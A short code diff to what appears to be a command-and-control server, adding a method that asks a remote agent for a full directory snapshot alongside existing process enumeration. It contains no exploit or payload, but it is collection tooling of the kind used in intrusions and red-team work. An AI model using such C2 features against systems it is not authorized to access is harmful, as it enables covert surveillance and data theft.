@@ -1,7 +1,8 @@
 import uuid
 
 from arq.jobs import Job
-from darkscryc2server.models.messages import CommandIdentifiers
+from darkscryc2server.models.messages import AgentResponse, CommandIdentifiers
+from darkscryc2server.utils.remote_manager import remote_send_command
 
 from ...utils.tasks import get_task_executor
 
@@ -67,3 +68,11 @@ class CollectionService:
             action_id=CommandIdentifiers.ENUMERATE_PROCESSES,
         )
         return uuid.UUID(job.job_id)
+
+    async def stream_directory(self, agent_id: uuid.UUID, path: str) -> AgentResponse:
+        """Retrieve a directory snapshot directly from the agent."""
+        return await remote_send_command(
+            agent_id=str(agent_id),
+            action_id=CommandIdentifiers.SNAP_FULL_DIRECTORY,
+            command={"path": path},
+        )
